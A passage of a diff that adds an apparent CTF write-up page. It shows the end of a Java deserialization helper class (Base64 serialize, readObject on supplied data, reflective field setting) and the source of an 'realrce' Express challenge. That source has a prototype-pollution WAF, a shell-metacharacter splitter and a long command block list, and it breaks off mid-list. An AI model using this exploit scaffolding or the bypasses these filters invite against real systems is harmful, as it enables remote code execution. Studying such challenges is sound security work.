+        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());
+        <span class="hljs-keyword">return</span> base64String;
+
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);
+        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);
+        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);
+        ois.readObject();
+        ois.close();
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        field.set(obj, value);
+    &#125;
+
+&#125;</code></pre></div>
+
+<h2 id="realrce"><a href="#realrce" class="headerlink" title="realrce"></a>realrce</h2><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);
+<span class="hljs-keyword">var</span> proc = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);
+<span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);
+
+<span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();
+app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());
+app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);
+app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/images&#x27;</span>, express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;/app/static&#x27;</span>));
+
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">input_code</span>) &#123;
+    bypasspin = <span class="hljs-regexp">/%[0-9a-fA-F]&#123;2&#125;/i</span>;
+    <span class="hljs-keyword">const</span> bypasscode = bypasspin.<span class="hljs-title function_">test</span>(input_code);
+    <span class="hljs-keyword">if</span> (bypasscode) &#123;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-title function_">waf</span>(<span class="hljs-built_in">decodeURIComponent</span>(input_code));
+        &#125; <span class="hljs-keyword">catch</span> (error) &#123;
+            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Error decoding input: &quot;</span>, error);
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">const</span> blacklist = [<span class="hljs-regexp">/__proto__/i</span>, <span class="hljs-regexp">/constructor/i</span>, <span class="hljs-regexp">/prototype/i</span>];
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> blackword <span class="hljs-keyword">of</span> blacklist) &#123;
+        <span class="hljs-keyword">if</span> (blackword.<span class="hljs-title function_">test</span>(input_code)) &#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+&#125;
+
+
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">LockCylinder</span>(<span class="hljs-params">input, blackchr = [<span class="hljs-string">&quot;&amp;&amp;&quot;</span>, <span class="hljs-string">&quot;||&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>]</span>) &#123;
+    <span class="hljs-keyword">const</span> resultArray = [];
+    <span class="hljs-keyword">let</span> currentPart = <span class="hljs-string">&quot;&quot;</span>;
+
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; input.<span class="hljs-property">length</span>; i++) &#123;
+        <span class="hljs-keyword">const</span> currentChar = input[i];
+
+        <span class="hljs-keyword">if</span> (blackchr.<span class="hljs-title function_">includes</span>(currentChar)) &#123;
+            <span class="hljs-keyword">if</span> (currentPart.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;
+                resultArray.<span class="hljs-title function_">push</span>(currentPart);
+                currentPart = <span class="hljs-string">&quot;&quot;</span>;
+            &#125;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            currentPart += currentChar;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">if</span> (currentPart.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;
+        resultArray.<span class="hljs-title function_">push</span>(currentPart);
+    &#125;
+
+    <span class="hljs-keyword">return</span> resultArray;
+&#125;
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">check_cmd</span>(<span class="hljs-params">cmd</span>) &#123;
+    <span class="hljs-keyword">const</span> command = [<span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;&lt;&gt;&quot;</span>, <span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;if&quot;</span>, <span class="hljs-string">&quot;then&quot;</span>, <span class="hljs-string">&quot;else&quot;</span>, <span class="hljs-string">&quot;elif&quot;</span>, <span class="hljs-string">&quot;fi&quot;</span>, <span class="hljs-string">&quot;case&quot;</span>, <span class="hljs-string">&quot;esac&quot;</span>, <span class="hljs-string">&quot;for&quot;</span>, <span class="hljs-string">&quot;select&quot;</span>, <span class="hljs-string">&quot;while&quot;</span>, <span class="hljs-string">&quot;until&quot;</span>, <span class="hljs-string">&quot;do&quot;</span>, <span class="hljs-string">&quot;done&quot;</span>, <span class="hljs-string">&quot;in&quot;</span>, <span class="hljs-string">&quot;function&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>, <span class="hljs-string">&quot;coproc&quot;</span>, <span class="hljs-string">&quot;alias&quot;</span>, <span class="hljs-string">&quot;bg&quot;</span>, <span class="hljs-string">&quot;bind&quot;</span>, <span class="hljs-string">&quot;break&quot;</span>, <span class="hljs-string">&quot;builtin&quot;</span>, <span class="hljs-string">&quot;caller&quot;</span>, <span class="hljs-string">&quot;cd&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;compgen&quot;</span>, <span class="hljs-string">&quot;complete&quot;</span>, <span class="hljs-string">&quot;compopt&quot;</span>, <span class="hljs-string">&quot;continue&quot;</span>, <span class="hljs-string">&quot;declare&quot;</span>, <span class="hljs-string">&quot;dirs&quot;</span>, <span class="hljs-string">&quot;disown&quot;</span>, <span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;enable&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>, <span class="hljs-string">&quot;export&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>, <span class="hljs-string">&quot;fc&quot;</span>, <span class="hljs-string">&quot;fg&quot;</span>, <span class="hljs-string">&quot;getopts&quot;</span>, <span class="hljs-string">&quot;hash&quot;</span>, <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;history&quot;</span>, <span class="hljs-string">&quot;jobs&quot;</span>, <span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;let&quot;</span>, <span class="hljs-string">&quot;local&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>, <span class="hljs-string">&quot;mapfile&quot;</span>, <span class="hljs-string">&quot;popd&quot;</span>, <span class="hljs-string">&quot;printf&quot;</span>, <span class="hljs-string">&quot;pushd&quot;</span>, <span class="hljs-string">&quot;pwd&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>, <span class="hljs-string">&quot;readarray&quot;</span>, <span class="hljs-string">&quot;readonly&quot;</span>, <span class="hljs-string">&quot;return&quot;</span>, <span class="hljs-string">&quot;set&quot;</span>, <span class="hljs-string">&quot;shift&quot;</span>, <span class="hljs-string">&quot;shopt&quot;</span>, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;suspend&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;times&quot;</span>, <span class="hljs-string">&quot;trap&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;typeset&quot;</span>, <span class="hljs-string">&quot;ulimit&quot;</span>, <span class="hljs-string">&quot;umask&quot;</span>, <span class="hljs-string">&quot;unalias&quot;</span>, <span class="hljs-string">&quot;unset&quot;</span>, <span class="hljs-string">&quot;wait&quot;</span>, <span class="hljs-string">&quot;vipw&quot;</span>, <span class="hljs-string">&quot;mkdumprd&quot;</span>, <span class="hljs-string">&quot;ifenslave&quot;</span>, <span class="hljs-string">&quot;fsck&quot;</span>, <span class="hljs-string">&quot;chpasswd&quot;</span>, <span class="hljs-string">&quot;useradd&quot;</span>, <span class="hljs-string">&quot;rtstat&quot;</span>, <span class="hljs-string">&quot;lnstat&quot;</span>, <span class="hljs-string">&quot;hwclock&quot;</span>, <span class="hljs-string">&quot;dhclient&quot;</span>, <span class="hljs-string">&quot;pwunconv&quot;</span>, <span class="hljs-string">&quot;groupmems&quot;</span>, <span class="hljs-string">&quot;mksquashfs&quot;</span>, <span class="hljs-string">&quot;chkconfig&quot;</span>, <span class="hljs-string">&quot;ethtool&quot;</span>, <span class="hljs-string">&quot;packer&quot;</span>, <span class="hljs-string">&quot;mkdict&quot;</span>, <span class="hljs-string">&quot;agetty&quot;</span>, <span class="hljs-string">&quot;applygnupgdefaults&quot;</span>, <span class="hljs-string">&quot;zramctl&quot;</span>, <span class="hljs-string">&quot;swaplabel&quot;</span>, <span class="hljs-string">&quot;blkzone&quot;</span>, <span class="hljs-string">&quot;pwconv&quot;</span>, <span class="hljs-string">&quot;cfdisk&quot;</span>, <span class="hljs-string">&quot;ldattach&quot;</span>, <span class="hljs-string">&quot;reboot&quot;</span>, <span class="hljs-string">&quot;tipc&quot;</span>, <span class="hljs-string">&quot;fstrim&quot;</span>, <span class="hljs-string">&quot;clockdiff&quot;</span>, <span class="hljs-string">&quot;groupadd&quot;</span>, <span class="hljs-string">&quot;dmfilemapd&quot;</span>, <span class="hljs-string">&quot;runuser&quot;</span>, <span class="hljs-string">&quot;modinfo&quot;</span>, <span class="hljs-string">&quot;swapoff&quot;</span>, <span class="hljs-string">&quot;telinit&quot;</span>, <span class="hljs-string">&quot;sfdisk&quot;</span>, <span class="hljs-string">&quot;ctstat&quot;</span>, <span class="hljs-string">&quot;clock&quot;</span>, <span class="hljs-string">&quot;rtpr&quot;</span>, <span class="hljs-string">&quot;fsfreeze&quot;</span>, <span class="hljs-string">&quot;ldconfig&quot;</span>, <span class="hljs-string">&quot;fdformat&quot;</span>, <span class="hljs-string">&quot;getcap&quot;</span>, <span class="hljs-string">&quot;kexec&quot;</span>, <span class="hljs-string">&quot;rdma&quot;</span>, <span class="hljs-string">&quot;tracepath&quot;</span>, <span class="hljs-string">&quot;rtmon&quot;</span>, <span class="hljs-string">&quot;rtacct&quot;</span>, <span class="hljs-string">&quot;fdisk&quot;</span>, <span class="hljs-string">&quot;udevadm&quot;</span>, <span class="hljs-string">&quot;usermod&quot;</span>, <span class="hljs-string">&quot;findfs&quot;</span>, <span class="hljs-string">&quot;halt&quot;</span>, <span class="hljs-string">&quot;resizepart&quot;</span>, <span class="hljs-string">&quot;routef&quot;</span>, <span class="hljs-string">&quot;genl&quot;</span>, <span class="hljs-string">&quot;mkswap&quot;</span>, <span class="hljs-string">&quot;poweroff&quot;</span>, <span class="hljs-string">&quot;rdisc&quot;</span>, <span class="hljs-string">&quot;grpunconv&quot;</span>, <span class="hljs-string">&quot;partx&quot;</span>, <span class="hljs-string">&quot;rtcwake&quot;</span>, <span class="hljs-string">&quot;nologin&quot;</span>, <span class="hljs-string">&quot;rfkill&quot;</span>, <span class="hljs-string">&quot;lspci&quot;</span>, <span class="hljs-string">&quot;vigr&quot;</span>, <span class="hljs-string">&quot;grpconv&quot;</span>, <span class="hljs-string">&quot;ip&quot;</span>, <span class="hljs-string">&quot;blkdeactivate&quot;</span>, <span class="hljs-string">&quot;addgnupghome&quot;</span>, <span class="hljs-string">&quot;chroot&quot;</span>, <span class="hljs-string">&quot;shutdown&quot;</span>, <span class="hljs-string">&quot;unsquashfs&quot;</span>, <span class="hljs-string">&quot;readprofile&quot;</span>, <span class="hljs-string">&quot;adduser&quot;</span>, <span class="hljs-string">&quot;groupmod&quot;</span>, <span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-string">&quot;dmstats&quot;</span>, <span class="hljs-string">&quot;ifcfg&quot;</span>, <span class="hljs-string">&quot;modprobe&quot;</span>, <span class="hljs-string">&quot;depmod&quot;</span>, <span class="hljs-string">&quot;iconvconfig&quot;</span>, <span class="hljs-string">&quot;sulogin&quot;</span>, <span class="hljs-string">&quot;rmmod&quot;</span>, <span class="hljs-string">&quot;grpck&quot;</span>, <span class="hljs-string">&quot;nstat&quot;</span>, <span class="hljs-string">&quot;ifstat&quot;</span>, <span class="hljs-string">&quot;sysctl&quot;</span>, <span class="hljs-string">&quot;insmod&quot;</span>, <span class="hljs-string">&quot;routel&quot;</span>, <span class="hljs-string">&quot;zdump&quot;</span>, <span class="hljs-string">&quot;blkdiscard&quot;</span>, <span class="hljs-string">&quot;getpcaps&quot;</span>, <span class="hljs-string">&quot;losetup&quot;</span>, <span class="hljs-string">&quot;setpci&quot;</span>, <span class="hljs-string">&quot;dmsetup&quot;</span>, <span class="hljs-string">&quot;wipefs&quot;</span>, <span class="hljs-string">&quot;addpart&quot;</span>, <span class="hljs-string">&quot;zic&quot;</span>, <span class="hljs-string">&quot;userdel&quot;</span>, <span class="hljs-string">&quot;makedumpfile&quot;</span>, <span class="hljs-string">&quot;blkid&quot;</span>, <span class="hljs-string">&quot;groupdel&quot;</span>, <span class="hljs-string">&quot;setcap&quot;</span>, <span class="hljs-string">&quot;chgpasswd&quot;</span>, <span class="hljs-string">&quot;resolvconf&quot;</span>, <span class="hljs-string">&quot;newusers&quot;</span>, <span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;arping&quot;</span>, <span class="hljs-string">&quot;pwck&quot;</span>, <span class="hljs-string">&quot;devlink&quot;</span>, <span class="hljs-string">&quot;lsmod&quot;</span>, <span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;mkfs&quot;</span>, <span class="hljs-string">&quot;faillock&quot;</span>, <span class="hljs-string">&quot;runlevel&quot;</span>, <span class="hljs-string">&quot;blockdev&quot;</span>, <span class="hljs-string">&quot;swapon&quot;</span>, <span class="hljs-string">&quot;alternatives&quot;</span>, <span class="hljs-string">&quot;arpd&quot;</span>, <span class="hljs-string">&quot;delpart&quot;</span>, <span class="hljs-string">&quot;pidof&quot;</span>, <span class="hljs-string">&quot;chcpu&quot;</span>, <span class="hljs-string">&quot;capsh&quot;</span>, <span class="hljs-string">&quot;ctrlaltdel&quot;</span>, <span class="hljs-string">&quot;bridge&quot;</span>, <span class="hljs-string">&quot;less&quot;</span>, <span class="hljs-string">&quot;gpgsplit&quot;</span>, <span class="hljs-string">&quot;pgrep&quot;</span>, <span class="hljs-string">&quot;truncate&quot;</span>, <span class="hljs-string">&quot;localedef&quot;</span>, <span class="hljs-string">&quot;printf&quot;</span>, <span class="hljs-string">&quot;gencat&quot;</span>, <span class="hljs-string">&quot;sed&quot;</span>, <span class="hljs-string">&quot;ptx&quot;</span>, <span class="hljs-string">&quot;nm&quot;</span>, <span class="hljs-string">&quot;pwmake&quot;</span>, <span class="hljs-string">&quot;zmore&quot;</span>, <span class="hljs-string">&quot;tzselect&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>, <span class="hljs-string">&quot;dnsdomainname&quot;</span>, <span class="hljs-string">&quot;ar&quot;</span>, <span class="hljs-string">&quot;more&quot;</span>, <span class="hljs-string">&quot;journalctl&quot;</span>, <span class="hljs-string">&quot;gunzip&quot;</span>, <span class="hljs-string">&quot;makedb&quot;</span>, <span class="hljs-string">&quot;tac&quot;</span>, <span class="hljs-string">&quot;col&quot;</span>, <span class="hljs-string">&quot;sync&quot;</span>, <span class="hljs-string">&quot;vi&quot;</span>, <span class="hljs-string">&quot;locale&quot;</span>, <span class="hljs-string">&quot;prlimit&quot;</span>, <span class="hljs-string">&quot;nisdomainname&quot;</span>, <span class="hljs-string">&quot;timedatectl&quot;</span>, <span class="hljs-string">&quot;ipcmk&quot;</span>, <span class="hljs-string">&quot;isosize&quot;</span>, <span class="hljs-string">&quot;free&quot;</span>, <span class="hljs-string">&quot;alias&quot;</span>, <span class="hljs-string">&quot;taskset&quot;</span>, <span class="hljs-string">&quot;factor&quot;</span>, <span class="hljs-string">&quot;pinky&quot;</span>, <span class="hljs-string">&quot;arch&quot;</span>, <span class="hljs-string">&quot;lscpu&quot;</span>, <span class="hljs-string">&quot;awk&quot;</span>, <span class="hljs-string">&quot;tty&quot;</span>, <span class="hljs-string">&quot;xmllint&quot;</span>, <span class="hljs-string">&quot;xzcmp&quot;</span>, <span class="hljs-string">&quot;readelf&quot;</span>, <span class="hljs-string">&quot;kdumpctl&quot;</span>, <span class="hljs-string">&quot;tsort&quot;</span>, <span class="hljs-string">&quot;nice&quot;</span>, <span class="hljs-string">&quot;cal&quot;</span>, <span class="hljs-string">&quot;rpmdb&quot;</span>, <span class="hljs-string">&quot;newgrp&quot;</span>, <span class="hljs-string">&quot;xmlwf&quot;</span>, <span class="hljs-string">&quot;slabtop&quot;</span>, <span class="hljs-string">&quot;utmpdump&quot;</span>, <span class="hljs-string">&quot;tar&quot;</span>, <span class="hljs-string">&quot;basename&quot;</span>, <span class="hljs-string">&quot;eject&quot;</span>, <span class="hljs-string">&quot;ranlib&quot;</span>, <span class="hljs-string">&quot;wall&quot;</span>, <span class="hljs-string">&quot;zless&quot;</span>, <span class="hljs-string">&quot;sort&quot;</span>, <span class="hljs-string">&quot;nsenter&quot;</span>, <span class="hljs-string">&quot;getent&quot;</span>, <span class="hljs-string">&quot;chrt&quot;</span>, <span class="hljs-string">&quot;mount&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;systemctl&quot;</span>, <span class="hljs-string">&quot;vmstat&quot;</span>, <span class="hljs-string">&quot;xmlcatalog&quot;</span>, <span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-string">&quot;lsinitrd&quot;</span>, <span class="hljs-string">&quot;tload&quot;</span>, <span class="hljs-string">&quot;chmod&quot;</span>, <span class="hljs-string">&quot;setsid&quot;</span>, <span class="hljs-string">&quot;getopts&quot;</span>, <span class="hljs-string">&quot;colcrt&quot;</span>, <span class="hljs-string">&quot;su&quot;</span>, <span class="hljs-string">&quot;lsipc&quot;</span>, <span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;lsns&quot;</span>, <span class="hljs-string">&quot;unalias&quot;</span>, <span class="hljs-string">&quot;lastb&quot;</span>, <span class="hljs-string">&quot;df&quot;</span>, <span class="hljs-string">&quot;gpg&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;gpgv&quot;</span>, <span class="hljs-string">&quot;pathchk&quot;</span>, <span class="hljs-string">&quot;groups&quot;</span>, <span class="hljs-string">&quot;lsmem&quot;</span>, <span class="hljs-string">&quot;users&quot;</span>, <span class="hljs-string">&quot;as&quot;</span>, <span class="hljs-string">&quot;ipcs&quot;</span>, <span class="hljs-string">&quot;jobs&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;iconv&quot;</span>, <span class="hljs-string">&quot;dwp&quot;</span>, <span class="hljs-string">&quot;domainname&quot;</span>, <span class="hljs-string">&quot;xzcat&quot;</span>, <span class="hljs-string">&quot;ldd&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;strip&quot;</span>, <span class="hljs-string">&quot;dircolors&quot;</span>, <span class="hljs-string">&quot;nl&quot;</span>, <span class="hljs-string">&quot;trust&quot;</span>, <span class="hljs-string">&quot;stty&quot;</span>, <span class="hljs-string">&quot;ul&quot;</span>, <span class="hljs-string">&quot;chacl&quot;</span>, <span class="hljs-string">&quot;loginctl&quot;</span>, <span class="hljs-string">&quot;gzip&quot;</span>, <span class="hljs-string">&quot;xzmore&quot;</span>, <span class="hljs-string">&quot;zcat&quot;</span>, <span class="hljs-string">&quot;busctl&quot;</span>, <span class="hljs-string">&quot;fincore&quot;</span>, <span class="hljs-string">&quot;fgrep&quot;</span>, <span class="hljs-string">&quot;dmesg&quot;</span>, <span class="hljs-string">&quot;rm&quot;</span>, <span class="hljs-string">&quot;mv&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;lslogins&quot;</span>, <span class="hljs-string">&quot;numfmt&quot;</span>, <span class="hljs-string">&quot;flock&quot;</span>, <span class="hljs-string">&quot;realpath&quot;</span>, <span class="hljs-string">&quot;find&quot;</span>, <span class="hljs-string">&quot;tracepath&quot;</span>, <span class="hljs-string">&quot;lesskey&quot;</span>, <span class="hljs-string">&quot;printenv&quot;</span>, <span class="hljs-string">&quot;du&quot;</span>, <span class="hljs-string">&quot;grep&quot;</span>, <span class="hljs-string">&quot;udevadm&quot;</span>, <span class="hljs-string">&quot;tee&quot;</span>, <span class="hljs-string">&quot;rename&quot;</span>, <span class="hljs-string">&quot;gawk&quot;</span>, <span class="hljs-string">&quot;mkdir&quot;</span>, <span class="hljs-string">&quot;sg&quot;</span>, <span class="hljs-string">&quot;xzegrep&quot;</span>, <span class="hljs-string">&quot;xzdec&quot;</span>, <span class="hljs-string">&quot;split&quot;</span>, <span class="hljs-string">&quot;whereis&quot;</span>, <span class="hljs-string">&quot;strings&quot;</span>, <span class="hljs-string">&quot;setfacl&quot;</span>, <span class="hljs-string">&quot;mkfifo&quot;</span>, <span class="hljs-string">&quot;chage&quot;</span>, <span class="hljs-string">&quot;xzgrep&quot;</span>, <span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;rvi&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-string">&quot;ypdomainname&quot;</span>, <span class="hljs-string">&quot;tr&quot;</span>, <span class="hljs-string">&quot;umount&quot;</span>, <span class="hljs-string">&quot;rev&quot;</span>, <span class="hljs-string">&quot;wdctl&quot;</span>, <span class="hljs-string">&quot;uniq&quot;</span>, <span class="hljs-string">&quot;ps&quot;</span>, <span class="hljs-string">&quot;stdbuf&quot;</span>, <span class="hljs-string">&quot;chgrp&quot;</span>, <span class="hljs-string">&quot;setarch&quot;</span>, <span class="hljs-string">&quot;cd&quot;</span>, <span class="hljs-string">&quot;dirmngr&quot;</span>, <span class="hljs-string">&quot;write&quot;</span>, <span class="hljs-string">&quot;lastlog&quot;</span>, <span class="hljs-string">&quot;gsettings&quot;</span>, <span class="hljs-string">&quot;ex&quot;</span>, <span class="hljs-string">&quot;ipcrm&quot;</span>, <span class="hljs-string">&quot;cp&quot;</span>, <span class="hljs-string">&quot;fallocate&quot;</span>, <span class="hljs-string">&quot;colrm&quot;</span>, <span class="hljs-string">&quot;rpm&quot;</span>, <span class="hljs-string">&quot;pwdx&quot;</span>, <span class="hljs-string">&quot;xargs&quot;</span>, <span class="hljs-string">&quot;objdump&quot;</span>, <span class="hljs-string">&quot;ld&quot;</span>, <span class="hljs-string">&quot;chcon&quot;</span>, <span class="hljs-string">&quot;skill&quot;</span>, <span class="hljs-string">&quot;yum&quot;</span>, <span class="hljs-string">&quot;who&quot;</span>, <span class="hljs-string">&quot;gapplication&quot;</span>, <span class="hljs-string">&quot;stat&quot;</span>, <span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-string">&quot;wait&quot;</span>, <span class="hljs-string">&quot;fg&quot;</span>, <span class="hljs-string">&quot;uuidgen&quot;</span>, <span class="hljs-string">&quot;logger&quot;</span>, <span class="hljs-string">&quot;pwscore&quot;</span>, <span class="hljs-string">&quot;xz&quot;</span>, <span class="hljs-string">&quot;mesg&quot;</span>, <span class="hljs-string">&quot;rmdir&quot;</span>, <span class="hljs-string">&quot;zgrep&quot;</span>, <span class="hljs-string">&quot;chmem&quot;</span>, <span class="hljs-string">&quot;newuidmap&quot;</span>, <span class="hljs-string">&quot;evmctl&quot;</span>, <span class="hljs-string">&quot;wc&quot;</span>, <span class="hljs-string">&quot;top&quot;</span>, <span class="hljs-string">&quot;egrep&quot;</span>, <span class="hljs-string">&quot;fold&quot;</span>, <span class="hljs-string">&quot;zfgrep&quot;</span>, <span class="hljs-string">&quot;link&quot;</span>, <span class="hljs-string">&quot;csplit&quot;</span>, <span class="hljs-string">&quot;sum&quot;</span>, <span class="hljs-string">&quot;expand&quot;</span>, <span class="hljs-string">&quot;getfacl&quot;</span>, <span class="hljs-string">&quot;newgidmap&quot;</span>, <span class="hljs-string">&quot;join&quot;</span>, <span class="hljs-string">&quot;install&quot;</span>, <span class="hljs-string">&quot;bootctl&quot;</span>, <span class="hljs-string">&quot;xzless&quot;</span>, <span class="hljs-string">&quot;runcon&quot;</span>, <span class="hljs-string">&quot;dirname&quot;</span>, <span class="hljs-string">&quot;comm&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>, <span class="hljs-string">&quot;hostname&quot;</span>, <span class="hljs-string">&quot;unlink&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;ipcalc&quot;</span>, <span class="hljs-string">&quot;unexpand&quot;</span>, <span class="hljs-string">&quot;nohup&quot;</span>, <span class="hljs-string">&quot;zegrep&quot;</span>, <span class="hljs-string">&quot;head&quot;</span>, <span class="hljs-string">&quot;getopt&quot;</span>, <span class="hljs-string">&quot;raw&quot;</span>, <span class="hljs-string">&quot;hexdump&quot;</span>, <span class="hljs-string">&quot;mountpoint&quot;</span>, <span class="hljs-string">&quot;lslocks&quot;</span>, <span class="hljs-string">&quot;coreutils&quot;</span>, <span class="hljs-string">&quot;shred&quot;</span>, <span class="hljs-string">&quot;sotruss&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;pldd&quot;</span>, <span class="hljs-string">&quot;uuidparse&quot;</span>, <span class="hljs-string">&quot;localectl&quot;</span>, <span class="hljs-string">&quot;gtar&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;znew&quot;</span>, <span class="hljs-string">&quot;logname&quot;</span>, <span class="hljs-string">&quot;gzexe&quot;</span>, <span class="hljs-string">&quot;rpmquery&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;hash&quot;</span>, <span class="hljs-string">&quot;cpio&quot;</span>, <span class="hljs-string">&quot;sprof&quot;</span>, <span class="hljs-string">&quot;hostnamectl&quot;</span>, <span class="hljs-string">&quot;uname&quot;</span>, <span class="hljs-string">&quot;unxz&quot;</span>, <span class="hljs-string">&quot;zdiff&quot;</span>, <span class="hljs-string">&quot;gdbus&quot;</span>, <span class="hljs-string">&quot;namei&quot;</span>, <span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;kmod&quot;</span>, <span class="hljs-string">&quot;info&quot;</span>, <span class="hljs-string">&quot;umask&quot;</span>, <span class="hljs-string">&quot;zcmp&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;mktemp&quot;</span>, <span class="hljs-string">&quot;pwd&quot;</span>, <span class="hljs-string">&quot;column&quot;</span>, <span class="hljs-string">&quot;scriptreplay&quot;</span>, <span class="hljs-string">&quot;lessecho&quot;</span>, <span class="hljs-string">&quot;look&quot;</span>, <span class="hljs-string">&quot;setterm&quot;</span>, <span class="hljs-string">&quot;gdbmtool&quot;</span>, <span class="hljs-string">&quot;rpmkeys&quot;</span>, <span class="hljs-string">&quot;bg&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;gpasswd&quot;</span>, <span class="hljs-string">&quot;dracut&quot;</span>, <span class="hljs-string">&quot;vdir&quot;</span>, <span class="hljs-string">&quot;mcookie&quot;</span>, <span class="hljs-string">&quot;elfedit&quot;</span>, <span class="hljs-string">&quot;chown&quot;</span>, <span class="hljs-string">&quot;objcopy&quot;</span>, <span class="hljs-string">&quot;hostid&quot;</span>, <span class="hljs-string">&quot;shuf&quot;</span>, <span class="hljs-string">&quot;view&quot;</span>, <span class="hljs-string">&quot;mknod&quot;</span>, <span class="hljs-string">&quot;gpgparsemail&quot;</span>, <span class="hljs-string">&quot;fc&quot;</span>, <span class="hljs-string">&quot;tail&quot;</span>, <span class="hljs-string">&quot;zforce&quot;</span>, <span class="hljs-string">&quot;last&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>, <span 